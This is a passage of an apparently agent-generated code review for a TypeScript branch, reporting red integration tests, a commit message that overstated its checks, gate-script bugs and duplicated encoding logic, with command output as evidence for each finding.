# Review: crossval-4-6-absorption

**Date:** 2026-08-16
**Verdict:** NEEDS_FIXES
**Reviewers (spawned agents):** 8 (review-crossval-4-6-absorption-architecture, review-crossval-4-6-absorption-cross-validation, review-crossval-4-6-absorption-domain-api-design, review-crossval-4-6-absorption-domain-concurrency, review-crossval-4-6-absorption-domain-security, orchestrator, review-crossval-4-6-absorption-tests, review-crossval-4-6-absorption-wiring)
**Total findings:** 96

## Findings summary by severity

| Severity | Count |
|---|---|
| BLOCKER | 9 |
| HIGH | 32 |
| MEDIUM | 35 |
| LOW | 13 |
| INFO | 7 |

## BLOCKER findings (9)

### F-arch-1: 7fea1388 changed the published signature and did not migrate the one real-filesystem test of the oracle; `pnpm test` and `pnpm typecheck` are both RED on HEAD, and the commit message asserts the opposite.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `tests/integration/liveness-oracle-real-tree.test.ts` line 35
- **Plan reference:** T3.2 Acceptance Criteria / cycle-review.md "Hard gates — Failing tests on the working branch"
- **Evidence:**

  The file still wires the pre-7fea1388 contract:
  ```ts
  // tests/integration/liveness-oracle-real-tree.test.ts:34-47
  const out = classifyProjects([encode(alive), encode(moved), encode(gone)], {
    listProjects: () => [alive, moved],        // renamed to candidatePaths
    budget: 100,
    fs: { exists: (p) => { ops += 1; return existsSync(p) } },  // FsSeam now needs listEntries+firstLine
  })
  ...
  expect(out.get(encode(gone))?.liveness).toBe('dead')   // now `undetermined` by design
  ```
  Measured on HEAD:
  ```
  $ npx vitest run tests/integration/liveness-oracle-real-tree.test.ts
   FAIL  test_the_verdicts_match_what_is_on_disk
   AssertionError: expected 'undetermined' to be 'alive'   (line 45)
   Test Files  1 failed (1)
  
  $ npx tsc --noEmit -p tsconfig.json ; echo $?
  tests/integration/liveness-oracle-real-tree.test.ts(37,7): error TS2739: Type
    '{ exists: (p: string) => boolean; }' is missing the following properties from
    type 'FsSeam': listEntries, firstLine
  tests/integration/liveness-oracle-real-tree.test.ts(59,7): error TS2739: ...
  2
  ```
  `package.json:16` — `"typecheck": "tsc --noEmit"` (root program, which includes tests/).
  The 7fea1388 commit message states `tsc exit 0 · eslint exit 0 · sessao vizinha 72/72`;
  that is true for the package tsconfig and false for the repo gate that `check:all`
  (`package.json:33`) actually runs. The immediately preceding commit on this branch is
  `0d82cd3e fix(implement): catch the stale-artifact typecheck at handoff, not in the dev loop`.
  Architecturally this is worse than a red build: the file's own docstring (:4-7) says it exists
  "because a seam that models `existsSync` slightly wrong would make every unit test agree with
  a fiction". That is the only coverage the oracle has against its own seam, and it is dead.

- **Recommended action:** Migrate the file in the same commit as the signature change — pass `projectsRoot`, rename to `candidatePaths`, supply real `listEntries`/`firstLine`, and re-derive the `gone` expectation (now `undetermined` unless a transcript records the cwd; write a transcript into the fixture so the `dead` path is exercised on a real filesystem, since it is the delete path). Re-run `pnpm typecheck && pnpm test` before handoff.

### F-xval-1: HEAD is red. Two integration test files fail and `pnpm typecheck` exits 2. The T3.2 rewrite (7fea1388) changed `FsSeam` and left its own sibling integration test behind.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `tests/integration/liveness-oracle-real-tree.test.ts:45`
- **Plan reference:** Global Definition of Done — 'All tests passing — pnpm test green in theokit' and 'Zero type errors — pnpm typecheck in each repo'
- **Evidence:**

  $ pnpm typecheck
  tests/integration/liveness-oracle-real-tree.test.ts(37,7): error TS2739: Type '{ exists: ... }'
    is missing the following properties from type 'FsSeam': listEntries, firstLine
  tests/integration/liveness-oracle-real-tree.test.ts(59,7): error TS2739: (same)
  ELIFECYCLE Command failed with exit code 2.
  
  $ npx vitest run tests/integration/liveness-oracle-real-tree.test.ts
  × test_the_verdicts_match_what_is_on_disk
    AssertionError: expected 'undetermined' to be 'alive'   (line 45)
  
  $ pnpm test   (full suite)
  Test Files  2 failed | 823 passed | 2 skipped (827)
  Tests       2 failed | 6437 passed | 21 skipped (6460)
  Errors      2 errors
  
  The second failing file is the branch's own gate:
  tests/integration/typecheck-clean-gate.test.ts:18 — "pnpm typecheck exits 0" — expected 2 to be +0.
  
  Provenance: the file was created by c3527883 (T3.2, first implementation) and NOT updated by
  7fea1388 (T3.2, rewrite). `git status --porcelain` is clean, so this is committed state.
  `pnpm lint` IS green across all 9 groups — the failure is confined to types + this test.

- **Recommended action:** Update tests/integration/liveness-oracle-real-tree.test.ts to the new FsSeam (listEntries + firstLine) and the new verdict semantics, then re-run pnpm typecheck and pnpm test. This blocks `cycle-review.md § Hard gates` ("Failing tests on the working branch").

### F-xval-2: Commit 7fea1388 asserts "tsc exit 0 · eslint exit 0" in its trailer. tsc did not exit 0 at that commit — the same interface change the commit made is what broke it.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `7fea1388 (commit message, final line)`
- **Plan reference:** Unbreakable Rule 3 (honesty); cycle-implement.md § Hard gates (per iteration) — 'Test suite green before commit'
- **Evidence:**

  7fea1388 trailer: "Suites: liveness-oracle 19/19 · sessao vizinha 72/72 · tsc exit 0 · eslint exit 0"
  
  The two type errors of F-xval-1 are deterministic consequences of the FsSeam widening made IN
  7fea1388. HEAD differs from 7fea1388 only by f838333d (docs) and c5465d16 (backlog.md +
  .wiring-evidence.json) — neither touches tsconfig, the FsSeam, or the failing test. Therefore
  the errors were present at 7fea1388.
  
  $ git show 7fea1388:tests/integration/liveness-oracle-real-tree.test.ts | grep -n 'exists:'
  38:        exists: (p) => {
  59:      fs: { exists: existsSync },
  
  The two unit suites named in the trailer (19/19, 72/72) were measured and are real. The
  integration file that the same change broke was not. This is precisely the failure mode the
  plan exists to prevent: a true green number standing in for a claim nobody checked.

- **Recommended action:** Fix F-xval-1, then amend the record (a follow-up commit stating the correction — never a rewrite of shared history per git-safety.md § 2). Going forward, the pre-commit measurement for a signature change must be repo-wide `pnpm typecheck`, not the suites of the changed module.

### F-xval-3: The Goal's metric is not met, and the substitute register that was written to carry it declares a different 17 than the plan does, with a derivation that does not reproduce against the plan.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.claude/knowledge-base/plans/crossval-4-6-absorption-plan.md § Goal, § Global DoD`
- **Plan reference:** Goal — 'measured by tests/integration/crossval-gaps.test.ts passing 17/17 closure assertions'; Global DoD — '17/17 assertions green in tests/integration/crossval-gaps.test.ts'
- **Evidence:**

  (a) The named file is the wrong register.
      tests/integration/crossval-gaps.test.ts:168-180 declares G1..G12; :200 asserts
      toHaveLength(12). It runs 32/32 green and covers the PREDECESSOR plan.
  
  (b) The substitute executes 11 of 17.
      $ npx vitest run tests/integration/crossval-4-6-closure.test.ts --reporter=verbose
      [crossval-4-6 closure] 6 of 17 gaps are BLOCKED and were not asserted
      [crossval-4-6 closure] 11/17 closure assertions executed.
      Three of the six (29, F78, F80) contain only `expect.fail('unreachable while blocked')`
      behind an early return, i.e. they have no assertion at all.
  
  (c) The substitute's stated derivation is wrong.
      crossval-4-6-closure.test.ts:20-21 says: "The Coverage Matrix has 20 rows. Two are
      explicitly deferred ... F80 is declared 'Same as gap 26'. 20 - 2 - 1 = 17."
      The Coverage Matrix at plan:2192-2222 has 29 data rows, not 20. The arithmetic does not
      reproduce.
  
  (d) It is a different 17 than the plan's.
      Plan's Global DoD defines the 17 as: "16 close a gap; the 17th, from T1.1, pins the
      reachability that gap 16 wrongly denied." The plan's 16 registered gaps are
      {13,14,15,17,18,19,20,21,22,23,24,25,26,27,28,29} plus the T1.1 pin.
      The register's 17 are {13,15,17,18,19,20,21,22,24,26,27,28,29,F59,F78,F79,F80}.
      It OMITS gap 14 (the matrix marks it **critical**, closed by T0.1 and genuinely testable),
      gap 23, gap 25, and the T1.1 pin — and substitutes four findings the plan counted in a
      different denominator. It carries no assertion for the plan's only DEFECT row
      (forkBeforeUserTurn, T2.3), which IS implemented and IS testable.
  
  (e) The substitute file is not authorized by the plan or by any ADR. It was created at review
      time by a485e798, whose own docblock explains why.

- **Recommended action:** Do not report the Goal as met. Either (a) state plainly in the implementation summary and the review verdict that the metric is 11 closed + 6 blocked and the re-score has not run, or (b) amend the plan via cycle-plan with an ADR that names the substitute file, fixes the derivation against the real 29-row matrix, and adds rows for gap 14, the T2.3 defect and the T1.1 pin — the three closed items the register currently cannot see.

### F-orch-1: /implement validation returns overall_status FAIL, which blocks /review's own pre-condition. The single failing check is checkpoint_consistency, and it is a DEFECT IN THE GATE rather than in the implementation.


- **Found by:** orchestrator
- **File:** `.claude/skills/implement/scripts/check_checkpoint_consistency.py` line 100
- **Plan reference:** cycle-review.md § Pre-conditions ("/implement validation FAILed and was not addressed")
- **Evidence:**

  run_validation.py crossval-4-6-absorption:
    checkpoint_consistency  FAIL   <- the only FAIL
    npm test / typecheck / lint / test:coverage   PASS
    code_quality            PASS   <- the gate /review actually requires
  
  It flags T1.2, T5.0, T5.1, T5.2 as "referenced by a real commit in git but the
  checkpoint still marks it 'blocked'". Root cause, measured two ways:
  
  (a) The scan is repository-wide, not plan-scoped: `git log -n 500` over ALL recent
      history, matching a bare `T{N.M}` token. T5.1 and T5.2 appear ZERO times in this
      branch's commits and are matched by commits from a DIFFERENT plan:
        99d5ec57 feat(scripts): T5.1 — o gate de paridade anda por todos os subpaths
        e3595b4b docs(plan): T5.2 dispara o gatilho de divisao que o D8 declarou
      Task ids are generic, so ANY repo running more than one plan will collide.
  
  (b) For T1.2 and T5.0 the match is this plan's own commits, where the id appears in
      explanatory PROSE ("T5.0 is blocked because…"), not as an implementation claim.
  
  Independently verified: zero commits implement Phase 5.
    git log --oneline origin/develop..HEAD --format="%h %s" | grep -iE "T5\.[0-4]"  ->  empty

- **Recommended action:** Fix in /implement, not here (cycle-review: this skill never modifies code). Two candidate fixes: scope the id scan to the plan's own commit range, and/or exempt tasks already recorded `blocked` WITH a reason — those are loudly reported by the sibling `phase_has_blocked_tasks` check, so exempting them hides nothing. Until then /review cannot honour its own pre-condition, and this finding must not be dismissed by the implementer who diagnosed it.


### F-tests-A: Commit 7fea1388 changed classifyProjects' contract and updated only the two unit suites. The integration test — which is pillar (b) for classifyProjects and the plan's named real-tree proof — still calls the deleted API. It is RED on HEAD, and it is also the sole cause of the branch's typecheck gate being RED. This is F-wire-1's pattern reproduced by the commit that was fixing F-arch-1.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `tests/integration/liveness-oracle-real-tree.test.ts` line 37
- **Plan reference:** T3.2 / EC-24 / Global DoD "Runtime-metric proof"; cycle-review.md § Hard gates ("Failing tests on the working branch")
- **Evidence:**

  npx vitest run tests/integration/liveness-oracle-real-tree.test.ts
    × test_the_verdicts_match_what_is_on_disk
    AssertionError: expected 'undetermined' to be 'alive'
     ❯ tests/integration/liveness-oracle-real-tree.test.ts:45:46
    Test Files 1 failed (1) | Tests 1 failed | 1 passed (2)
  
  pnpm typecheck  (2 errors, both from this one file):
    tests/integration/liveness-oracle-real-tree.test.ts(37,7): error TS2739:
      Type '{ exists: (p: string) => boolean; }' is missing the following properties
      from type 'FsSeam': listEntries, firstLine
    tests/integration/liveness-oracle-real-tree.test.ts(59,7): error TS2739: (same)
  
  Consequently a SECOND integration test is red — the gate this very plan added:
    FAIL tests/integration/typecheck-clean-gate.test.ts > pnpm typecheck exits 0
    AssertionError: expected 2 to be +0
  
  Full root-serial run: "Test Files 2 failed | 98 passed"; both failures are this file.
  
  It still passes `listProjects:` (renamed to `candidatePaths` at
  packages/agents/src/session/liveness-oracle.ts:74), omits the now-required
  `projectsRoot`, and supplies an FsSeam without listEntries/firstLine. Its third
  assertion (`gone` -> 'dead') encodes the exact belief 7fea1388 falsified: without a
  recorded cwd the new module returns `undetermined`, by design.
  
  The checkpoint still claims this pillar holds:
  .claude/knowledge-base/implementations/.progress-crossval-4-6-absorption.json T3.2 ->
  "wiring": {"a": true, "b": true, "c": null}, files include this test file.
  Pillar (b) for classifyProjects is false as of 7fea1388 and the checkpoint was not updated.
  
  Why it was not caught: the root-serial vitest project sets `typecheck: {enabled: false}`
  (vitest.config.ts:46), so a `.test.ts` under tests/integration is only type-checked by
  `pnpm typecheck` — which the commit did not re-run. This is the same class of
  stale/skipped verification that produced F-wire-1.

- **Recommended action:** Migrate the file to the new contract: pass projectsRoot, rename listProjects to candidatePaths, add real listEntries/firstLine implementations over the tmpdir, and write a transcript for the `gone` project so `dead` is asserted on the branch that can now produce it. Then re-run `pnpm typecheck` and `npx vitest run --project root-serial` and re-issue the implement-validate report — the current green lines predate 7fea1388.


### F-wire-15: The breaking rewrite of classifyProjects (7fea1388) migrated the two UNIT test files and left the integration test — the only file that actually CALLS the symbol — on the old signature. The test is RED at HEAD and `pnpm typecheck` exits 2. classifyProjects therefore has pillar (b) = FAIL, not pass.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `tests/integration/liveness-oracle-real-tree.test.ts` line 37
- **Plan reference:** T3.2 / Global DoD "Zero type errors — pnpm typecheck in each repo" + cycle-review § Hard gates ("Failing tests on the working branch")
- **Evidence:**

  7fea1388 --name-only touches exactly: .changeset/…, CHANGELOG.md, src/session/liveness-oracle.ts,
  tests/unit/liveness-oracle-recorded-cwd.test.ts, tests/unit/liveness-oracle.test.ts.
  tests/integration/liveness-oracle-real-tree.test.ts is NOT in that list, and still calls:
    :36  classifyProjects([...], { listProjects: () => [alive, moved], budget: 100,
                                   fs: { exists: (p) => {...} } })
  against the new required shape (liveness-oracle.ts:59 `projectsRoot: string`,
  :74 `candidatePaths: () => readonly string[]`, :38-43 `FsSeam` now needs listEntries + firstLine).
  
  Reproduced, both ways:
    $ npx vitest run tests/integration/liveness-oracle-real-tree.test.ts
      × test_the_verdicts_match_what_is_on_disk
        AssertionError: expected 'undetermined' to be 'alive'   (:45)
      Test Files 1 failed (1) · Tests 1 failed | 1 passed (2)
    $ npx tsc --noEmit ; echo $?   →   2
      tests/integration/liveness-oracle-real-tree.test.ts(37,7): TS2739 … missing listEntries, firstLine
      tests/integration/liveness-oracle-real-tree.test.ts(59,7): TS2739 … missing listEntries, firstLine
  
  Why nothing caught it: the register written to close F-xval-1
  (tests/integration/crossval-4-6-closure.test.ts:182-185) covers gap 21 with `reachable('classifyProjects')`,
  which reads a NAME out of packages/agents/dist/*.d.ts. The name is still there, so the register is
  green while the function cannot be called with the arguments this repo's own test passes it.

- **Recommended action:** Migrate tests/integration/liveness-oracle-real-tree.test.ts to candidatePaths + projectsRoot + the widened FsSeam, re-run it RED-first against the pre-7fea1388 expectation to confirm it exercises the new path, then re-run `pnpm typecheck` and re-issue the implement-validate report — the current one predates 7fea1388 and its typecheck PASS is not about this tree.

### F-wire-16: wiring_recheck derived ZERO symbols for the whole slice because all commit SHAs are passed to one `git show` with check=True, and three of them live in sibling repos. One unresolvable SHA discards the other twelve. Pillar (a) has therefore never been independently confirmed for ANY symbol on this branch, while the checkpoint carries 16 positive self-reports.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `.claude/skills/implement/scripts/diff_symbols.py` line 68
- **Plan reference:** cycle-implement.md § Hard gates (post-halt-loop) — "Wiring summary — independently re-verified, never self-reported"
- **Evidence:**

  diff_symbols.py:70-76 — subprocess.run(["git","-C",repo_root,"show",...,*shas], check=True)
  on SubprocessError → `return set()`. shas_from_progress() (:46-58) ignores the per-task `repo`
  field that commit 3c940f48 added to progress-schema.json for exactly this situation and that
  check_checkpoint_consistency.py already honors.
  
  Reproduced:
    added_symbols_from_shas('.', all 15 SHAs)                       -> 0 symbols
    added_symbols_from_shas('.', minus 7cb57baff/9d4d37c/e1e7ca2)   -> 240 symbols,
      including classifyProjects, transcriptRootHint, expandCommandTemplate, templateHints,
      shouldAutoApprove, applyPosture, APPROVAL_MODES, createPendingLedger, deleteSession,
      runTranscriptGC, findUnreachableEnforcement, DOORLESS_DECISIONS.
    (7cb57baff = ../theokit-sdk, 9d4d37c + e1e7ca2 = ../theokit-tui — each declared in the
     checkpoint's own `repo` field.)
  
  Consequence in the shipped report
  (.claude/knowledge-base/reviews/crossval-4-6-absorption-implement-validate-2026-08-16.md:55-63):
    wiring_triad — N/A · "Symbols derived from diff: 0 / Symbols independently resolved: 0 /
    Pillar (a) NOT independently confirmed" · "Self-reported pillar (a) pass (claim, audited): 4"
  followed at :82 by "Implementation PASSes all gates. Ready for cycle-review". The check is
  honest; the handoff line launders it. Every in-repo symbol was derivable the entire time.

- **Recommended action:** Group SHAs by the task's declared `repo` and run one `git show` per repo, tolerating a repo that is absent (SKIP by name, never a silent empty set). Then re-run run_validation.py and publish the real per-symbol pillar (a) table. Secondary: the patterns also capture prose ('is', 'to', 'that') and destructured locals — filter to names that resolve to an `export` before scoring, or the resolved/derived ratio is meaningless.

### F-wire-17: Six tasks self-report pillar (a) positive over symbols whose ONLY production reference is the barrel that re-exports them. None of them is a planted no-op caller — the gaming this review hunts for is absent — but recording `true` where the honest value is `defer` is the fabricated-evidence category the plan's own rule names. 12 of the 16 entries additionally use the raw `true` instead of the enum.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `.claude/knowledge-base/implementations/.progress-crossval-4-6-absorption.json` line 230
- **Plan reference:** Plan rule — record `defer` naming the adopting task, NEVER a no-op caller; cycle-implement.md § Wiring triad, pillar (a) = "production code path that exercises the new behavior end-to-end"
- **Evidence:**

  Audited by reading every caller check_wiring.py reports. Barrel-only, adopter blocked in Phase 5:
    classifyProjects   — callers: packages/agents/src/session/index.ts:57 (barrel) only.
                         The framework's OWN GC never consults it: transcript-gc.ts imports
                         listSessions + protectedTranscripts + awaitRegistryRemoval and decides
                         by age/keepLast; `grep -n 'classify\|liveness' transcript-gc.ts` → 0 hits.
                         Adopter is T5.3 (status: blocked).      [T3.2 claims a: true]
    transcriptRootHint — callers: session/index.ts:47 (barrel) only.  [T2.6 claims a: true, b: true;
                         check_wiring pillar (b) = FAIL, no integration test exists]
    expandCommandTemplate / templateHints / FILE_INLINE_CAP
                       — callers: config-entry.ts:76 (barrel). Adopter is T5.2 (blocked).
                         [T3.3 claims a: true]
    createPendingLedger — callers: ask/index.ts:26 (barrel). ZERO production callers anywhere;
                         its own test docblock says so: pending-ledger-payload.test.ts:4
                         "the only real surface does not use it". [T2.7 claims a: true, b: true;
                         check_wiring pillar (b) = FAIL]
    toolPresentation / KNOWN_TOOL_NAMES / keyboardHelpFor / the `centred` anchor (../theokit-tui)
                       — callers: src/index.ts (barrel) only.   [T3.1, T3.4 claim a: true, b: true]
    @theokit/sdk/mcp-auth (../theokit-sdk) — a pure re-export barrel; runPkceFlow has no
                         production caller in the SDK either (only tests/golden/mcp/oauth.golden.test.ts).
                         [T1.3 claims a: true, b: true]
  
  Non-enum values, already flagged LOW by the progress_schema gate and still unfixed at HEAD:
  tasks[3,7,8,9,10,11,12,13,14,15,16,17] carry `wiring.a = True` / `wiring.b = True`.
  
  What is NOT wrong: no planted no-op caller was found. The one call site that looked degenerate —
  approval-posture.ts:180 `if (!shouldAutoApprove('full-auto','*',posturePolicy.confinedBy))` with
  two literal arguments — is a genuine replacement of the previous inline
  `if (!posturePolicy.confinedBy.enforced)` (git show 7fea1388^..; see the diff of
  approval-posture.ts), reached in production from sdk-adapter.ts:684. That one is an honest PASS.

- **Recommended action:** Rewrite the 8 barrel-only entries as `"a": "defer"` with the adopting task named (T5.2 / T5.3), and normalise the 12 raw booleans to the enum. `defer` is the truthful and PERMITTED value here — Phase 5 is blocked on a release gate, which is a legitimate reason. What is not permitted is `pass`.


## HIGH findings (32)

### F-arch-2: F-arch-1 is NOT closed. The rewrite fixed the symptom (`likelyPath`) and left the duplication — and added two more restatements of the encoding, both explicitly written to avoid depending on the module's copy, so no gate can now detect drift.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 97
- **Plan reference:** previous review F-arch-1; ADR D4; rules/system-design-guardrails.md § G12
- **Evidence:**

  The local copy and its justification are unchanged by 7fea1388:
  ```ts
  // liveness-oracle.ts:97-100
  /** The encoding this module is the inverse-by-search of. Kept local: it is one line and it is ours. */
  function encodeProjectDir(cwd: string): string {
    return cwd.replace(/[^a-zA-Z0-9]/g, '-')
  }
  ```
  "it is ours" is still factually wrong. The owner is the SDK
  (`theokit-sdk/.../session-transcript.ts:51`), published on `@theokit/sdk/persistence`, and the
  sibling file one directory away imports it:
  ```ts
  // packages/agents/src/session/project-index.ts:9
  import { encodeProjectDir, transcriptRoot } from '@theokit/sdk/persistence'
  ```
  `packages/agents/src/persistence-entry.ts:25` re-exports the SDK's on a published subpath, and
  `wiki/capability-index.md:106` tells customers the SDK owns it.
  
  The previous review offered one escape hatch: "if a local copy is genuinely required for
  testability, add a test asserting byte-equality with the SDK export". The opposite was done —
  both test files now restate the rule a THIRD and FOURTH time, on purpose:
  ```ts
  // packages/agents/tests/unit/liveness-oracle-recorded-cwd.test.ts:34-35
  /** The encoding under test, restated here so the test does not depend on the module's private copy. */
  const encode = (cwd: string): string => cwd.replace(/[^a-zA-Z0-9]/g, '-')
  // packages/agents/tests/unit/liveness-oracle.test.ts:91 — identical restatement
  ```
  So the on-disk layout rule now has 4 representations inside this repo plus the SDK's owner, and
  zero equality assertion between any pair. G12: "Same enum/constant defined in multiple files"
  / one knowledge, one authoritative representation.
  
  Honest re-scoring of the blast radius (this part DID improve): after 7fea1388 a drift between
  the copies degrades the recorded-cwd path to `absent` -> `undetermined` rather than to `dead`,
  because `dead` now requires `encodeProjectDir(cwd) === name` to have MATCHED (:181). The
  remaining exposure is (a) `searchPool`'s `alive` verdict at :217 and (b) silent loss of the
  91-of-120 fast path with no signal. Not data loss any more; still a DRY violation with no gate.

- **Recommended action:** Delete the local function and `import { encodeProjectDir } from '@theokit/sdk/persistence'` (or reuse `projectDirMatches` from `./project-index.js`, which already wraps it). Delete the two test restatements and import the same symbol there. If a local copy is kept for any reason, add `expect(localEncode(p)).toBe(sdkEncode(p))` over an adversarial path table and correct the two docstrings that claim this package owns the encoding (`liveness-oracle.ts:97`, `session/index.ts:55`).

### F-arch-3: 7fea1388 concentrated the ENTIRE `dead` authority onto a two-valued `exists()` probe, and the seam cannot express the consumer's B-020 scar ("cannot tell" ≠ "absent"). The idiomatic adapter — the one the framework's own test wires — reports EACCES as `false`.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 39
- **Plan reference:** ADR D5 ("Absorb the consumer's scar tissue, not its interface"); T3.2
- **Evidence:**

  After the rewrite, exactly one line can return `dead`:
  ```ts
  // liveness-oracle.ts:269-276
  const at = probe(recorded.cwd)
  ...
  out.set(name, at.found
    ? { liveness: 'alive', ... }
    : { liveness: 'dead', reason: `recorded cwd ${recorded.cwd} is gone` })
  ```
  and `probe` reads a boolean seam:
  ```ts
  // liveness-oracle.ts:38-39
  export interface FsSeam { exists: (path: string) => boolean; ... }
  ```
  The consumer this was absorbed from documents precisely this as a fixed defect, and its seam
  is three-valued for that reason:
  ```ts
  // TheoCode/packages/agent/src/session/liveness-oracle.ts:19
  isDirectory(path: string): boolean | undefined
  //   B-020 — `undefined` means "I cannot tell", and is NOT the same answer as `false`.
  //   The adapter used to map every `statSync` failure to `false` ... so a cwd that exists but
  //   cannot be stat-ed (EACCES ..., ENOTDIR ..., EMFILE ...) was classified DEAD.
  // TheoCode/packages/agent/src/session/gc/filesystem.ts:61-68
  isDirectory(path) { try { return statSync(path).isDirectory() }
    catch (err) { return err.code === 'ENOENT' ? false : undefined } }
  // TheoCode/.../liveness-oracle.ts:176-180
  const present = io.isDirectory(cwd)
  if (present === undefined) return { state: 'UNDETERMINED', ... }
  ```
  The framework's module says a throw is the third outcome ("a throw is a third outcome, never
  'absent'", :36) — but the type gives the adapter no way to say "cannot tell" other than
  throwing, no adapter ships, and the obvious `existsSync` NEVER throws. The framework's own
  integration test does exactly that: `fs: { exists: existsSync }`
  (tests/integration/liveness-oracle-real-tree.test.ts:59). No test in either oracle suite makes
  `exists` fail on the recorded-cwd path — the only EACCES test drives `listEntries`
  (liveness-oracle-recorded-cwd.test.ts:193-213).
  
  Net: the interface was absorbed and the scar was dropped, on the one path where the caller
  DELETES — the exact failure D5 was written to prevent.

- **Recommended action:** Change the seam to `exists: (path: string) => boolean | undefined` (or `stat: (path) => 'present' | 'absent' | 'unknown'`), treat `undefined` as `undetermined` at :271, and ship a node adapter in the package (`nodeFsSeam()`) that maps only ENOENT to absent, mirroring `filesystem.ts:61-68`. Add the RED test: `exists` throwing/returning-unknown on a recorded cwd must never yield `dead`.

### F-arch-4: `candidatePaths` has no supplier the only measured consumer can provide, so `searchPool` is unreachable in the one real deployment and the absorption delivered the cheap half of the capability.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 74
- **Plan reference:** ADR D4 ("Move the liveness oracle into the layer; leave project enumeration injected"); O5
- **Evidence:**

  The option's own docstring records that the consumer's enumerator returns the wrong thing:
  ```ts
  // liveness-oracle.ts:62-72
  * REAL ABSOLUTE PATHS that might be the project — not encoded directory names.
  * ... the only consumer's `listProjects` returns ENCODED NAMES ...
  ```
  Confirmed in the consumer: `TheoCode/packages/agent/src/session/gc/all-sessions.ts:48`
  `listProjects: () => string[]` returns `readdirSync(projectsRoot)` entries (encoded names), and
  its resolution of a *path* is a DFS from `/` (`dfsExists`, budgeted at 200 000 nodes).
  So the product has nothing to hand `candidatePaths`, and the branch's own pillar-(c)
  measurement says so:
  ```json
  // .wiring-evidence.json:11
  "The framework side was given an EMPTY candidate pool (candidatePaths: () => []).
   The consumer additionally does a DFS from / for projects with no transcript, which the
   framework cannot do without an injected pool. All 6 disagreements are that asymmetry"
  ```
  Consequence: ~35 LOC of `searchPool` — dedup, the EC-9 symlink-cycle handling, the budget
  guard — is dead code in production; the ~3 200 fall-through projects D4 cites as the motivation
  resolve to `undetermined`; and O5 ("TheoCode deletes ≥ 900 lines") cannot be met for this
  cluster because the DFS must stay downstream. D4's rationale was "the cost belongs where the
  cause is"; the framework took the one-line recorded-cwd read and left the search, which is the
  part the framework's lossy encoding actually caused.

- **Recommended action:** Decide and record which of the two: (a) absorb the bounded DFS as a shipped default `candidatePaths` (the framework owns the reason it is needed), keeping the injected override for products with a workspace list; or (b) amend D4 to state that the framework absorbs only the recorded-cwd resolution, delete `searchPool` and its options as YAGNI (G11 — a seam with zero satisfiable suppliers), and re-scope O5/Coverage-Matrix row 21 to the smaller deletion. Shipping a required seam nobody can satisfy is the worst of the three.

### F-arch-5: Pillar (c) was closed by hand-writing the artifact the pillar-(c) gate reads, which the implement contract names as forbidden; the producing script is not committed and the run is not reproducible from this repo.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `.wiring-evidence.json` line 3
- **Plan reference:** previous review F-wire-2; rules/cycle-implement.md § Validation halt-loop ("Forbidden: ... hand-edited `.wiring-evidence.json`")
- **Evidence:**

  ```json
  // .wiring-evidence.json:2-10
  "_provenance": {
    "written_by": "manual sweep against the operator's real project tree, 2026-08-16",
    "closes": "review F-wire-2 (pillar (c) was 0/27)",
    "how_to_reproduce": "... the script must be run from the TheoCode repo, whose tsconfig paths
       resolve the consumer oracle's single import ...",
    "honest_limits": ["This is a MANUAL sweep, not integration-test infra. The file is
       hand-written from a measured run; no test writes it yet." ]
  ```
  Against the contract:
  - `.claude/skills/implement/SKILL.md:103` — "`.wiring-evidence.json` (written by integration test infra)"
  - `.claude/skills/implement/prompts/validation-fix-prompt.md:57` — "NEVER hand-edit `.wiring-evidence.json` (Unbreakable: no fabricated evidence)"
  - `.claude/skills/implement/SKILL.md:324` — "Forbidden: no-op caller, hand-edited `.wiring-evidence.json`."
  - `.claude/skills/implement/scripts/check_wiring.py:236` reads exactly this path and will now score pillar (c) PASS from it.
  The numbers look real and the file is unusually honest about its limits — that is not the
  issue. The issue is that the one artifact designed to be machine-produced is now
  human-produced, the generator is not in any repo, and the gate cannot tell the difference. The
  rule exists because "measured once by hand" and "measured by infra on every run" are different
  claims, and only the second survives the next commit.

- **Recommended action:** Commit the comparison script (it can live under `scripts/` or `tests/integration/` with the consumer path injected) and have it WRITE `.wiring-evidence.json`; keep the current numbers in `.claude/knowledge-base/dogfood/evidence/` or the implementation summary as the dated manual run they are. If the cross-repo run cannot be automated before merge, mark pillar (c) `deferred` with an ADR (the path SKILL.md:107 prescribes) rather than satisfying the gate with a hand-written file.

### F-arch-6: STILL OPEN, byte-identical. `toolPresentation()` still returns a hand-rolled object asserted `as ReadonlyMap` whose `get` never returns `undefined` while `has` disagrees.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `../theokit-tui/src/tool-presentation.ts` line 330
- **Plan reference:** previous review F-arch-2 / F-dom-4 (re-check); rules/type-safety.md "Prohibited Patterns"; G3
- **Evidence:**

  `theokit-tui` HEAD is `e1e7ca2` with a clean working tree; the construct is unchanged:
  ```ts
  // ../theokit-tui/src/tool-presentation.ts:316-330
  return {
    get: (name: string) => merged.get(name) ?? genericPresentation(name),
    has: (name: string) => merged.has(name),
    ...
  } as ReadonlyMap<string, ToolPresentation>;
  ```
  while the sibling export declared with the SAME type has the opposite behaviour:
  ```ts
  // :294-295
  export const DEFAULT_TOOL_PRESENTATION: ReadonlyMap<string, ToolPresentation> =
    new Map(DEFAULT_ENTRIES);
  ```
  LSP: two values of one declared type answer `get(unknownName)` differently, and `has` is false
  for names `get` answers. The `as` is what hides it from the compiler.

- **Recommended action:** Return the real merged `Map` and expose the total lookup as a separate named function (`presentationFor(map, name): ToolPresentation`), as the previous review recommended. Nothing about the fix has changed.

### F-arch-7: STILL OPEN. No `Object.freeze` exists in either file; `WRITE_SCOPED_TOOLS` is a mutable `Set` typed `ReadonlySet`, and the tui docstring still claims its Map is "Frozen".

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/bridge/approval-decision.ts` line 52
